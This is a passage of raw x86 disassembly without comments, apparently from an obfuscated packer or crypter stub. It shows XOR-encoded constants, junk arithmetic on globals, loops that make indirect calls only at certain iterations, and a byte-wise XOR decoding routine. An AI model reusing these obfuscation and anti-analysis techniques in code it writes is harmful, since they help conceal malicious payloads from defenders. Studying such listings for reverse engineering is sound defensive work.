  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421a96
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421c9e
  41afcc:	mov    ecx,DWORD PTR ds:0x421a0e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238d2
  41b017:	push   0x423852
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c16
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x42382d
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423844
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c36
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421b8c
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x4239a2
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423af1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d2a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
